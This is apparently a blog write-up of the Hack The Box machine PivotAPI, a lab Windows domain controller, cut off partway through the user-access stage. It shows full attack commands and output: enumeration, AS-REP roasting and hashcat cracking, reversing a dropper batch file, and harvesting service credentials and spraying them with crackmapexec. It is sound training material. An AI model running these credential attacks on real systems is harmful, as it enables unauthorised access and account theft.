PivotAPI</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/windows/querier/ title="[HTB] Machine: Querier">[HTB] Machine: Querier</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/windows/rabbit/ title="[HTB] Machine: Rabbit">[HTB] Machine: Rabbit</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/windows/reel/ title="[HTB] Machine: Reel">[HTB] Machine: Reel</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/windows/reel2/ title="[HTB] Machine: Reel2">[HTB] Machine: Reel2</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/windows/remote/ title="[HTB] Machine: Remote">[HTB] Machine: Remote</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/windows/resolute/ title="[HTB] Machine: Resolute">[HTB] Machine: Resolute</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/windows/return/ title="[HTB] Machine: Return">[HTB] Machine: Return</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/windows/sauna/ title="[HTB] Machine: Sauna">[HTB] Machine: Sauna</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/windows/scrambled/ title="[HTB] Machine: Scrambled">[HTB] Machine: Scrambled</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/windows/search/ title="[HTB] Machine: Search">[HTB] Machine: Search</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/windows/secnotes/ title="[HTB] Machine: SecNotes">[HTB] Machine: SecNotes</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/windows/servmon/ title="[HTB] Machine: Servmon">[HTB] Machine: Servmon</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/windows/sharp/ title="[HTB] Machine: Sharp">[HTB] Machine: Sharp</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/windows/silo/ title="[HTB] Machine: Silo">[HTB] Machine: Silo</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/windows/sizzle/ title="[HTB] Machine: Sizzle">[HTB] Machine: Sizzle</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/windows/sniper/ title="[HTB] Machine: Sniper">[HTB] Machine: Sniper</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/windows/streamio/ title="[HTB] Machine: StreamIO">[HTB] Machine: StreamIO</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/windows/support/ title="[HTB] Machine: Support">[HTB] Machine: Support</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/windows/tally/ title="[HTB] Machine: Tally">[HTB] Machine: Tally</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/windows/timelapse/ title="[HTB] Machine: Timelapse">[HTB] Machine: Timelapse</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/windows/toolbox/ title="[HTB] Machine: Toolbox">[HTB] Machine: Toolbox</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/windows/worker/ title="[HTB] Machine: Worker">[HTB] Machine: Worker</a></li></ul></li></ul></li><li><a href=/posts/cybersecurity/hackthebox/overview/ title="[HTB] Overview">[HTB] Overview</a></li></ul></li><li><i class="fas fa-plus-circle"></i><a href=/posts/cybersecurity/pentesting/>Pentesting</a><ul><li><a href=/posts/cybersecurity/pentesting/active_directory/ title="[Pentesting] Active Directory">[Pentesting] Active Directory</a></li><li><a href=/posts/cybersecurity/pentesting/attacking_services/ title="[Pentesting] Attacking Services">[Pentesting] Attacking Services</a></li><li><a href=/posts/cybersecurity/pentesting/file_transfers/ title="[Pentesting] File Transfers">[Pentesting] File Transfers</a></li><li><a href=/posts/cybersecurity/pentesting/footprinting_and_enumeration/ title="[Pentesting] Footprinting and Enumeration">[Pentesting] Footprinting and Enumeration</a></li><li><a href=/posts/cybersecurity/pentesting/linux_privilege_escalation/ title="[Pentesting] Linux Privilege Escalation">[Pentesting] Linux Privilege Escalation</a></li><li><a href=/posts/cybersecurity/pentesting/mobile_pentesting/ title="[Pentesting] Mobile Pentesting">[Pentesting] Mobile Pentesting</a></li><li><a href=/posts/cybersecurity/pentesting/network_pentesting/ title="[Pentesting] Network Pentesting">[Pentesting] Network Pentesting</a></li><li><a href=/posts/cybersecurity/pentesting/osint/ title="[Pentesting] OSINT">[Pentesting] OSINT</a></li><li><a href=/posts/cybersecurity/pentesting/pivoting_tunneling_and_port_forwarding/ title="[Pentesting] Pivoting, Tunneling and Port Forwarding">[Pentesting] Pivoting, Tunneling and Port Forwarding</a></li><li><a href=/posts/cybersecurity/pentesting/shells_and_payloads/ title="[Pentesting] Shells and Payloads">[Pentesting] Shells and Payloads</a></li><li><a href=/posts/cybersecurity/pentesting/web_attacks/ title="[Pentesting] Web Attacks">[Pentesting] Web Attacks</a></li><li><a href=/posts/cybersecurity/pentesting/windows_privilege_escalation/ title="[Pentesting] Windows Privilege Escalation">[Pentesting] Windows Privilege Escalation</a></li></ul></li><li><i class="fas fa-plus-circle"></i><a href=/posts/cybersecurity/pwn.college/>pwn.college</a><ul><li><a href=/posts/cybersecurity/pwn.college/overview/ title="[pwn.college] Overview">[pwn.college] Overview</a></li></ul></li></ul></li><li><i class="fas fa-plus-circle"></i><a href=/posts/projects/>Projects</a><ul><li><a href=/posts/projects/ums/ title="[Projects] User-mode Scheduling (UMS)">[Projects] User-mode Scheduling (UMS)</a></li></ul></li></div></ul></div></div></div></section><section class=content-section id=content-section><div class=content><div class="container p-0 read-area"><div class="hero-area col-sm-12" id=hero-area style=background-image:url(/posts/cybersecurity/hackthebox/machines/windows/pivotapi/images/pivotapi.png)></div><div class=page-content><div class="author-profile ml-auto align-self-lg-center"><img class=rounded-circle src=/images/logo_hub369d6c5ab3ad73350236cbc9a72876b_254257_120x120_fit_box_3.png alt="Author Image"><h5 class=author-name>Bektur Umarbaev</h5><p>Wednesday, October 4, 2023</p></div><div class=title><h1>[HTB] Machine: PivotAPI</h1></div><div class=taxonomy-terms><ul style=padding-left:0><li class=rounded><a href=/tags/htb/ class="btn, btn-sm">HTB</a></li><li class=rounded><a href=/tags/active-directory/ class="btn, btn-sm">active-directory</a></li><li class=rounded><a href=/tags/exiftool/ class="btn, btn-sm">exiftool</a></li><li class=rounded><a href=/tags/as-rep-roast/ class="btn, btn-sm">as-rep-roast</a></li><li class=rounded><a href=/tags/getuserspns/ class="btn, btn-sm">getuserspns</a></li><li class=rounded><a href=/tags/hashcat/ class="btn, btn-sm">hashcat</a></li><li class=rounded><a href=/tags/mssql/ class="btn, btn-sm">mssql</a></li><li class=rounded><a href=/tags/mssqlclient/ class="btn, btn-sm">mssqlclient</a></li><li class=rounded><a href=/tags/bloodhound/ class="btn, btn-sm">bloodhound</a></li><li class=rounded><a href=/tags/smbmap/ class="btn, btn-sm">smbmap</a></li><li class=rounded><a href=/tags/smbclient/ class="btn, btn-sm">smbclient</a></li><li class=rounded><a href=/tags/mbox/ class="btn, btn-sm">mbox</a></li><li class=rounded><a href=/tags/mutt/ class="btn, btn-sm">mutt</a></li><li class=rounded><a href=/tags/msgconvert/ class="btn, btn-sm">msgconvert</a></li><li class=rounded><a href=/tags/reverse-engineering/ class="btn, btn-sm">reverse-engineering</a></li><li class=rounded><a href=/tags/procmon/ class="btn, btn-sm">procmon</a></li><li class=rounded><a href=/tags/vbs/ class="btn, btn-sm">vbs</a></li><li class=rounded><a href=/tags/api-monitor/ class="btn, btn-sm">api-monitor</a></li><li class=rounded><a href=/tags/crackmapexec/ class="btn, btn-sm">crackmapexec</a></li><li class=rounded><a href=/tags/mssql-shell/ class="btn, btn-sm">mssql-shell</a></li><li class=rounded><a href=/tags/mssqlproxy/ class="btn, btn-sm">mssqlproxy</a></li><li class=rounded><a href=/tags/evil-winrm/ class="btn, btn-sm">evil-winrm</a></li><li class=rounded><a href=/tags/keepass/ class="btn, btn-sm">keepass</a></li><li class=rounded><a href=/tags/genericall/ class="btn, btn-sm">genericall</a></li><li class=rounded><a href=/tags/powersploit/ class="btn, btn-sm">powersploit</a></li><li class=rounded><a href=/tags/powerview/ class="btn, btn-sm">powerview</a></li><li class=rounded><a href=/tags/tunnel/ class="btn, btn-sm">tunnel</a></li><li class=rounded><a href=/tags/dotnet/ class="btn, btn-sm">dotnet</a></li><li class=rounded><a href=/tags/dnspy/ class="btn, btn-sm">dnspy</a></li><li class=rounded><a href=/tags/forcechangepassword/ class="btn, btn-sm">forcechangepassword</a></li><li class=rounded><a href=/tags/laps/ class="btn, btn-sm">laps</a></li><li class=rounded><a href=/tags/winpeas/ class="btn, btn-sm">winpeas</a></li><li class=rounded><a href=/tags/powershell-run-as/ class="btn, btn-sm">powershell-run-as</a></li></ul></div><div class=post-content id=post-content><h1 id=pivotapi>PivotAPI</h1><h2 id=enumeration>Enumeration</h2><ul><li><code>nmap</code></li></ul><pre tabindex=0><code>└─$ nmap -Pn -p- 10.10.10.240 --min-rate 5000                                                                              
Starting Nmap 7.94 ( https://nmap.org ) at 2023-10-06 03:10 BST
Nmap scan report for 10.10.10.240 (10.10.10.240)
Host is up (0.10s latency).
Not shown: 65515 filtered tcp ports (no-response)
PORT      STATE SERVICE
21/tcp    open  ftp
22/tcp    open  ssh
53/tcp    open  domain
88/tcp    open  kerberos-sec
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
389/tcp   open  ldap
445/tcp   open  microsoft-ds
464/tcp   open  kpasswd5
593/tcp   open  http-rpc-epmap
636/tcp   open  ldapssl
1433/tcp  open  ms-sql-s
3268/tcp  open  globalcatLDAP
3269/tcp  open  globalcatLDAPssl
9389/tcp  open  adws
49667/tcp open  unknown
49673/tcp open  unknown
49674/tcp open  unknown
49708/tcp open  unknown
52843/tcp open  unknown

Nmap done: 1 IP address (1 host up) scanned in 65.93 seconds
</code></pre><pre tabindex=0><code>└─$ nmap -Pn -p21,22,53,88,135,139,389,445,464,593,636,1433,3268,3269,9389 -sC -sV 10.10.10.240 --min-rate 5000
Starting Nmap 7.94 ( https://nmap.org ) at 2023-10-06 03:12 BST
Nmap scan report for 10.10.10.240 (10.10.10.240)
Host is up (0.10s latency).

PORT     STATE    SERVICE       VERSION
21/tcp   open     ftp           Microsoft ftpd
| ftp-syst: 
|_  SYST: Windows_NT
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| 02-19-21  03:06PM               103106 10.1.1.414.6453.pdf
| 02-19-21  03:06PM               656029 28475-linux-stack-based-buffer-overflows.pdf
| 02-19-21  12:55PM              1802642 BHUSA09-McDonald-WindowsHeap-PAPER.pdf
| 02-19-21  03:06PM              1018160 ExploitingSoftware-Ch07.pdf
| 08-08-20  01:18PM               219091 notes1.pdf
| 08-08-20  01:34PM               279445 notes2.pdf
| 08-08-20  01:41PM                  105 README.txt
|_02-19-21  03:06PM              1301120 RHUL-MA-2009-06.pdf
22/tcp   open     ssh           OpenSSH for_Windows_7.7 (protocol 2.0)
| ssh-hostkey: 
|   3072 fa:19:bb:8d:b6:b6:fb:97:7e:17:80:f5:df:fd:7f:d2 (RSA)
|   256 44:d0:8b:cc:0a:4e:cd:2b:de:e8:3a:6e:ae:65:dc:10 (ECDSA)
|_  256 93:bd:b6:e2:36:ce:72:45:6c:1d:46:60:dd:08:6a:44 (ED25519)
53/tcp   open     domain        Simple DNS Plus
88/tcp   open     kerberos-sec  Microsoft Windows Kerberos (server time: 2023-10-05 19:12:42Z)
135/tcp  open     msrpc         Microsoft Windows RPC
139/tcp  open     netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  filtered ldap
445/tcp  open     microsoft-ds?
464/tcp  filtered kpasswd5
593/tcp  open     ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open     tcpwrapped
1433/tcp open     ms-sql-s      Microsoft SQL Server 2019 15.00.2000.00; RTM
| ms-sql-ntlm-info: 
|   10.10.10.240:1433: 
|     Target_Name: LICORDEBELLOTA
|     NetBIOS_Domain_Name: LICORDEBELLOTA
|     NetBIOS_Computer_Name: PIVOTAPI
|     DNS_Domain_Name: LicorDeBellota.htb
|     DNS_Computer_Name: PivotAPI.LicorDeBellota.htb
|     DNS_Tree_Name: LicorDeBellota.htb
|_    Product_Version: 10.0.17763
| ms-sql-info: 
|   10.10.10.240:1433: 
|     Version: 
|       name: Microsoft SQL Server 2019 RTM
|       number: 15.00.2000.00
|       Product: Microsoft SQL Server 2019
|       Service pack level: RTM
|       Post-SP patches applied: false
|_    TCP port: 1433
| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
| Not valid before: 2023-10-05T19:05:41
|_Not valid after:  2053-10-05T19:05:41
|_ssl-date: 2023-10-05T19:13:30+00:00; -7h00m01s from scanner time.
3268/tcp open     ldap          Microsoft Windows Active Directory LDAP (Domain: LicorDeBellota.htb0., Site: Default-First-Site-Name)
3269/tcp open     tcpwrapped
9389/tcp open     mc-nmf        .NET Message Framing
Service Info: Host: PIVOTAPI; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2023-10-05T19:12:54
|_  start_date: N/A
|_clock-skew: mean: -7h00m01s, deviation: 0s, median: -7h00m01s

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 58.10 seconds
</code></pre><ul><li><code>smb</code></li></ul><pre tabindex=0><code>└─$ smbclient -N -L //10.10.10.240                                                              
Anonymous login successful

        Sharename       Type      Comment
        ---------       ----      -------
Reconnecting with SMB1 for workgroup listing.
do_connect: Connection to 10.10.10.240 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
Unable to connect with SMB1 -- no workgroup available
</code></pre><ul><li><code>dns</code></li></ul><pre tabindex=0><code>└─$ dig axfr LicorDeBellota.htb @PivotAPI.LicorDeBellota.htb                                                   

; &lt;&lt;&gt;&gt; DiG 9.19.17-1-Debian &lt;&lt;&gt;&gt; axfr LicorDeBellota.htb @PivotAPI.LicorDeBellota.htb
;; global options: +cmd
; Transfer failed.
</code></pre><ul><li><code>ldapsearch</code></li></ul><pre tabindex=0><code>└─$ ldapsearch -H ldap://LicorDeBellota.htb -x -s base namingcontexts           
# extended LDIF
#
# LDAPv3
# base &lt;&gt; (default) with scope baseObject
# filter: (objectclass=*)
# requesting: namingcontexts 
#

#
dn:
namingcontexts: DC=LicorDeBellota,DC=htb
namingcontexts: CN=Configuration,DC=LicorDeBellota,DC=htb
namingcontexts: CN=Schema,CN=Configuration,DC=LicorDeBellota,DC=htb
namingcontexts: DC=DomainDnsZones,DC=LicorDeBellota,DC=htb
namingcontexts: DC=ForestDnsZones,DC=LicorDeBellota,DC=htb

# search result
search: 2
result: 0 Success

# numResponses: 2
# numEntries: 1
</code></pre><pre tabindex=0><code>└─$ ldapsearch -H ldap://LicorDeBellota.htb -x -b &#34;DC=LicorDeBellota,DC=htb&#34;
# extended LDIF
#
# LDAPv3
# base &lt;DC=LicorDeBellota,DC=htb&gt; with scope subtree
# filter: (objectclass=*)
# requesting: ALL
#

# search result
search: 2
result: 1 Operations error
text: 000004DC: LdapErr: DSID-0C090A5C, comment: In order to perform this opera
 tion a successful bind must be completed on the connection., data 0, v4563

# numResponses: 1
</code></pre><ul><li>No results for <code>rpc</code></li><li><code>ftp</code></li></ul><pre tabindex=0><code>└─$ ftp anonymous@10.10.10.240
Connected to 10.10.10.240.
220 Microsoft FTP Service
331 Anonymous access allowed, send identity (e-mail name) as password.
Password: 
230 User logged in.
Remote system type is Windows_NT.
ftp&gt; ls
229 Entering Extended Passive Mode (|||57367|)
150 Opening ASCII mode data connection.
02-19-21  03:06PM               103106 10.1.1.414.6453.pdf
02-19-21  03:06PM               656029 28475-linux-stack-based-buffer-overflows.pdf
02-19-21  12:55PM              1802642 BHUSA09-McDonald-WindowsHeap-PAPER.pdf
02-19-21  03:06PM              1018160 ExploitingSoftware-Ch07.pdf
08-08-20  01:18PM               219091 notes1.pdf
08-08-20  01:34PM               279445 notes2.pdf
08-08-20  01:41PM                  105 README.txt
02-19-21  03:06PM              1301120 RHUL-MA-2009-06.pdf
226 Transfer complete.
</code></pre><ul><li>Running <code>exiftool</code> on <code>pdf</code> files shows <code>LicorDeBellota.htb\kaorz</code></li></ul><pre tabindex=0><code>======== notes2.pdf
ExifTool Version Number         : 12.67
File Name                       : notes2.pdf
Directory                       : .
File Size                       : 279 kB
File Modification Date/Time     : 2020:08:08 12:34:25+01:00
File Access Date/Time           : 2023:10:06 19:12:03+01:00
File Inode Change Date/Time     : 2023:10:06 19:12:03+01:00
File Permissions                : -rw-r--r--
File Type                       : PDF
File Type Extension             : pdf
MIME Type                       : application/pdf
PDF Version                     : 1.5
Linearized                      : No
Page Count                      : 5
XMP Toolkit                     : Image::ExifTool 12.03
Creator                         : Kaorz
Publisher                       : LicorDeBellota.htb
Producer                        : cairo 1.10.2 (http://cairographics.org)
</code></pre><h2 id=foothold>Foothold</h2><ul><li>Let&rsquo;s check if user is <code>AS-REP</code>-roastable</li></ul><pre tabindex=0><code>└─$ impacket-GetNPUsers -dc-ip PivotAPI.LicorDeBellota.htb LicorDeBellota.htb/kaorz -no-pass
Impacket v0.11.0 - Copyright 2023 Fortra

[*] Getting TGT for kaorz
$krb5asrep$23$kaorz@LICORDEBELLOTA.HTB:117660010b88116ef19ce2f9e608d1d9$a8f47a80fddd556b91bb360af849916358388168cf2ed0c2783c95ff09d799d504477fefe0d1a9ab33a92243939260e558b739cedd2a8c3d61bf85ae56360069cd38a4f14b04865afdbbbf99a3816da14b41058a0249c62c180d50337a6e3c27da5cdde876ca8b4f70f1d5624c1f3358e0a451bb5ec9cb3ee580148951680f5d06f2ce8c11bf61cb8600cbb290dd046a12ad9c8cae68e4ca9706c904189e4ef0a192f8cc192e6286241547ae151111d074323e54a174b945156365f6db2f80d9b7ec558ffa64b7fcd93206f055ecfbf973fa4fff67f20ea88d63fdc29d6aea709c7da2d8073ef9f7fcc3f36a39160138e0679042f7fd8441
</code></pre><ul><li>Let&rsquo;s crack it<ul><li><code>kaorz:Roper4155</code></li></ul></li></ul><pre tabindex=0><code>└─$ hashcat -m 18200 hash /usr/share/wordlists/rockyou.txt
hashcat (v6.2.6) starting

OpenCL API (OpenCL 3.0 PoCL 4.0+debian  Linux, None+Asserts, RELOC, SPIR, LLVM 15.0.7, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
==================================================================================================================================================
* Device #1: cpu-sandybridge-12th Gen Intel(R) Core(TM) i5-12400, 1435/2934 MB (512 MB allocatable), 2MCU
...
$krb5asrep$23$kaorz@LICORDEBELLOTA.HTB:117660010b88116ef19ce2f9e608d1d9$a8f47a80fddd556b91bb360af849916358388168cf2ed0c2783c95ff09d799d504477fefe0d1a9ab33a92243939260e558b739cedd2a8c3d61bf85ae56360069cd38a4f14b04865afdbbbf99a3816da14b41058a0249c62c180d50337a6e3c27da5cdde876ca8b4f70f1d5624c1f3358e0a451bb5ec9cb3ee580148951680f5d06f2ce8c11bf61cb8600cbb290dd046a12ad9c8cae68e4ca9706c904189e4ef0a192f8cc192e6286241547ae151111d074323e54a174b945156365f6db2f80d9b7ec558ffa64b7fcd93206f055ecfbf973fa4fff67f20ea88d63fdc29d6aea709c7da2d8073ef9f7fcc3f36a39160138e0679042f7fd8441:Roper4155
</code></pre><ul><li>The creds didn&rsquo;t work for <code>ssh</code></li></ul><pre tabindex=0><code>└─$ sshpass -p &#39;Roper4155&#39; ssh kaorz@10.10.10.240
Warning: Permanently added &#39;10.10.10.240&#39; (ED25519) to the list of known hosts.
Permission denied, please try again.
</code></pre><ul><li>No <code>SPN</code>s</li></ul><pre tabindex=0><code>└─$ impacket-GetUserSPNs LicorDeBellota.htb/Kaorz:&#39;Roper4155&#39; -dc-ip 10.10.10.240  
Impacket v0.11.0 - Copyright 2023 Fortra

No entries found!
</code></pre><ul><li>No access to <code>mysql</code></li></ul><pre tabindex=0><code>└─$ impacket-mssqlclient LicorDeBellota.htb/Kaorz:&#39;Roper4155&#39;@10.10.10.240 -windows-auth 
Impacket v0.11.0 - Copyright 2023 Fortra

[*] Encryption required, switching to TLS
[-] ERROR(PIVOTAPI\SQLEXPRESS): Line 1: Error de inicio de sesión del usuario &#39;LICORDEBELLOTA\Kaorz&#39;.
                                                                                                             
</code></pre><h2 id=user>User</h2><ul><li>Let&rsquo;s check <code>bloodhound</code></li></ul><pre tabindex=0><code>└─$ bloodhound-python -u kaorz -p &#39;Roper4155&#39; -d licordebellota.htb -dc licordebellota.htb -ns 10.10.10.240 --zip
INFO: Found AD domain: licordebellota.htb
INFO: Getting TGT for user
INFO: Connecting to LDAP server: licordebellota.htb
INFO: Kerberos auth to LDAP failed, trying NTLM
INFO: Found 1 domains
INFO: Found 1 domains in the forest
INFO: Found 1 computers
INFO: Found 28 users
INFO: Connecting to LDAP server: licordebellota.htb
INFO: Kerberos auth to LDAP failed, trying NTLM
INFO: Found 58 groups
INFO: Found 0 trusts
INFO: Starting computer enumeration with 10 workers
INFO: Querying computer: PivotAPI.LicorDeBellota.htb
INFO: Done in 00M 16S
INFO: Compressing output into 20231007112624_bloodhound.zip
</code></pre><ul><li>Nothing interesting<ul><li><code>Domain Users</code></li></ul></li></ul><p><img src=./images/1.png alt></p><ul><li>I&rsquo;ll check <code>smb</code></li></ul><pre tabindex=0><code>└─$ smbclient -L //10.10.10.240/ -U &#39;kaorz%Roper4155&#39;                                        

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Admin remota
        C$              Disk      Recurso predeterminado
        IPC$            IPC       IPC remota
        NETLOGON        Disk      Recurso compartido del servidor de inicio de sesión 
        SYSVOL          Disk      Recurso compartido del servidor de inicio de sesión 
Reconnecting with SMB1 for workgroup listing.
do_connect: Connection to 10.10.10.240 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
Unable to connect with SMB1 -- no workgroup available
</code></pre><ul><li>We have files in <code>Netlogon\HelpDesk</code></li></ul><pre tabindex=0><code>└─$ smbclient //10.10.10.240/NETLOGON -U &#39;kaorz%Roper4155&#39;           
Try &#34;help&#34; to get a list of possible commands.
smb: \&gt; ls
  .                                   D        0  Sat Aug  8 11:42:28 2020
  ..                                  D        0  Sat Aug  8 11:42:28 2020
  HelpDesk                            D        0  Sun Aug  9 16:40:36 2020

                5158399 blocks of size 4096. 1053109 blocks available
smb: \&gt; cd HelpDesk\
smb: \HelpDesk\&gt; ls
  .                                   D        0  Sun Aug  9 16:40:36 2020
  ..                                  D        0  Sun Aug  9 16:40:36 2020
  Restart-OracleService.exe           A  1854976  Fri Feb 19 10:52:01 2021
  Server MSSQL.msg                    A    24576  Sun Aug  9 12:04:14 2020
  WinRM Service.msg                   A    26112  Sun Aug  9 12:42:20 2020

                5158399 blocks of size 4096. 1053109 blocks available
</code></pre><ul><li>Download the files<ul><li>We see <code>msg</code> files, which are <code>Outlook</code> message files</li><li>We need to install <code>msgconvert</code> via <code>sudo apt-get install libemail-outlook-message-perl</code><ul><li><a href=https://www.matijs.net/software/msgconv target=_blank rel=noopener>https://www.matijs.net/software/msgconv</a></li></ul></li></ul></li></ul><pre tabindex=0><code>└─$ file *.msg            
Server MSSQL.msg:  CDFV2 Microsoft Outlook Message
WinRM Service.msg: CDFV2 Microsoft Outlook Message
</code></pre><ul><li>Run <code>msgconvert</code><ul><li>Now we have <code>eml</code> files, which we can read</li></ul></li></ul><pre tabindex=0><code>└─$ msgconvert *.msg
</code></pre><pre tabindex=0><code>Date: Sun, 09 Aug 2020 11:04:14 +0000
MIME-Version: 1.0
Content-Type: multipart/alternative; boundary=16967873760.dB4b.277836
Content-Transfer-Encoding: 7bit
Subject: Server MSSQL
To: cybervaca@licordebellota.htb &lt;cybervaca@licordebellota.htb&gt;
...
Good afternoon,
 
Due to the problems caused by the Oracle database installed in 2010 in Windows, it has been decided to migrate to MSSQL at the beginning of 2020.
Remember that there were problems at the time of restarting the Oracle service and for this reason a program called &#34;Reset-Service.exe&#34; was created to log in to Oracle and restart the service.
 
Any doubt do not hesitate to contact us.
 
Greetings,
 
The HelpDesk Team
</code></pre><pre tabindex=0><code>Date: Sun, 09 Aug 2020 11:42:20 +0000
MIME-Version: 1.0
Content-Type: multipart/alternative; boundary=16967873761.1De4bB9e.277836
Content-Transfer-Encoding: 7bit
Subject: WinRM Service
To: helpdesk@licordebellota.htb &lt;helpdesk@licordebellota.htb&gt;
...
Good afternoon.
 
After the last pentest, we have decided to stop externally displaying WinRM&#39;s service. Several of our employees are the creators of Evil-WinRM so we do not want to expose this service... We have created a rule to block the exposure of the service and we have also blocked the TCP, UDP and even ICMP output (So that no shells of the type icmp are used.)
Greetings,
 
The HelpDesk Team
</code></pre><ul><li>We have a <code>Restart-OracleService.exe</code> binary mentioned in the mail<ul><li>We probably have to reverse it</li></ul></li></ul><pre tabindex=0><code>└─$ file Restart-OracleService.exe 
Restart-OracleService.exe: PE32+ executable (console) x86-64, for MS Windows, 6 sections
</code></pre><ul><li>I&rsquo;ll open it in <code>IDA</code><ul><li>In strings view, I see a <code>inflate 1.2.11 Copyright 1995-2017 Mark Adler</code></li><li>It looks like a <a href=https://github.com/madler/zlib/blob/cacf7f1d4e3d44d871b605da3b647f07d718623f/inftrees.c#L12 target=_blank rel=noopener>Zlib library</a></li></ul></li></ul><p><img src=./images/2.png alt></p><ul><li>Nothing interesting, we try executing it and monitor the process via <code>Procmon</code><ul><li>Add <code>Restart-OracleService.exe</code> to filter<ul><li><code>Process Name -> is -> Restart-OracleService.exe</code></li></ul></li></ul></li></ul><p><img src=./images/3.png alt></p><ul><li>When we start the process, we receive bunch of events in <code>Procmon</code><ul><li>We can see that there is a process creation, where <code>cmd</code> tries to execute <code>bat</code> file</li></ul></li></ul><p><img src=./images/5.png alt></p><ul><li>If we check other events, we see that it creates <code>bat</code> file in <code>AppData\Local\Temp</code> directory of the user</li></ul><p><img src=./images/4.png alt></p><ul><li>In order to capture the <code>bat</code> file, we can remove modify permissions from <code>AppData\Local\Temp</code><ul><li>Remove <code>delete</code> permissions for a user that runs the binary</li></ul></li></ul><p><img src=./images/6.png alt></p><ul><li>Then run the executable again<ul><li>We see 2 files</li></ul></li></ul><p><img src=./images/7.png alt></p><ul><li>The content of the <code>bat</code> file</li></ul><pre tabindex=0><code>@shift /0
@echo off

if %username% == cybervaca goto correcto
if %username% == frankytech goto correcto
if %username% == ev4si0n goto correcto
goto error

:correcto
...
echo TVqQAAMAAAAEAAAA//8AALgAAAAAAAAAQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA &gt; c:\programdata\oracle.txt
...
echo $salida = $null; $fichero = (Get-Content C:\ProgramData\oracle.txt) ; foreach ($linea in $fichero) {$salida += $linea }; $salida = $salida.Replace(&#34; &#34;,&#34;&#34;); [System.IO.File]::WriteAllBytes(&#34;c:\programdata\restart-service.exe&#34;, [System.Convert]::FromBase64String($salida)) &gt; c:\programdata\monta.ps1
powershell.exe -exec bypass -file c:\programdata\monta.ps1
del c:\programdata\monta.ps1
del c:\programdata\oracle.txt
c:\programdata\restart-service.exe
del c:\programdata\restart-service.exe

:error
</code></pre><ul><li>Remove the user check at the start and the deletion at the end<ul><li>Save the file and run</li></ul></li></ul><p><img src=./images/8.png alt></p><ul><li>Now we have <code>restart-service.exe</code></li></ul><pre tabindex=0><code>└─$ file restart-service.exe 
/mnt/shared/restart-service.exe: PE32+ executable (console) x86-64 (stripped to external PDB), for MS Windows, 10 sections
</code></pre><ul><li>There few ways to analyse the executable<ul><li>We can use <a href=http://www.rohitab.com/apimonitor target=_blank rel=noopener>APIMonitor</a></li><li>Or use <code>x64debug</code> to dump the memory with a password</li><li>Since I never use <code>APIMonitor</code>, I&rsquo;ll try this approach<ul><li>We set a filter for <code>API</code> calls</li><li>Set it to <code>GetProcAddress</code></li></ul></li></ul></li></ul><p><img src=./images/9.png alt></p><ul><li>Then if start monitoring the process<ul><li>If you notice we have a <code>CreateProcessWithLogonW</code> call<ul><li><code>Creates a new process and its primary thread. Then the new process runs the specified executable file in the security context of the specified credentials (user, domain, and password). It can optionally load the user profile for a specified user.</code></li></ul></li></ul></li></ul><p><img src=./images/10.png alt></p><ul><li>So we set our new filter to <code>CreateProcessWithLogonW</code> and run executable again<ul><li>We can see the creds</li><li><code>svc_oracle:#oracle_s3rV1c3!2010</code></li></ul></li></ul><p><img src=./images/12.png alt></p><ul><li>But the creds don&rsquo;t work for <code>smb</code></li></ul><pre tabindex=0><code>└─$ crackmapexec smb 10.10.10.240 -u svc_oracle -p &#39;#oracle_s3rV1c3!2010&#39;
SMB         10.10.10.240    445    PIVOTAPI         [*] Windows 10.0 Build 17763 x64 (name:PIVOTAPI) (domain:LicorDeBellota.htb) (signing:True) (SMBv1:False)
SMB         10.10.10.240    445    PIVOTAPI         [-] LicorDeBellota.htb\svc_oracle:#oracle_s3rV1c3!2010 STATUS_LOGON_FAILURE 
</code></pre><ul><li>But if we check <code>bloodhound</code> again, there are no <code>svc_oracle</code> user<ul><li>Only <code>svc_mssql</code></li><li>If we change username to <code>svc_mssql</code> it also fails</li><li>But if we remember the message, that they were migrating from oracle to mssql, we could try modifying the password<ul><li>Change the year to 2020 and oracle to mssql, based on email</li></ul></li><li>And it works</li></ul></li></ul><pre tabindex=0><code>└─$ crackmapexec smb 10.10.10.240 -u svc_mssql -p &#39;#mssql_s3rV1c3!2020&#39;
SMB         10.10.10.240    445    PIVOTAPI         [*] Windows 10.0 Build 17763 x64 (name:PIVOTAPI) (domain:LicorDeBellota.htb) (signing:True) (SMBv1:False)
SMB         10.10.10.240    445    PIVOTAPI         [+] LicorDeBellota.htb\svc_mssql:#mssql_s3rV1c3!2020
</code></pre><ul><li>But we don&rsquo;t have access to <code>mssql</code></li></ul><pre tabindex=0><code>└─$ crackmapexec mssql 10.10.10.240 -u svc_mssql -p &#39;#mssql_s3rV1c3!2020&#39;
